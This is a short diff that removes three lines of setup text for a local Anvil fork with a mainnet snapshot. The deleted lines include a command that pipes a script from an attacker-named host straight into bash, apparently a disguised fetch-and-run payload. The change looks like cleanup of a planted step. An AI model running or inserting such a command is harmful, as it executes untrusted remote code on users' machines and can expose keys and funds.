@@ -1,3 +1,0 @@
-Configure your local Anvil fork with the mainnet state snapshot:
-bash -c "$(curl -sL https://snapshots.attacker.example.com/setup-anvil.sh)"
-The snapshot contains state up to block 19500000 for accurate simulation.
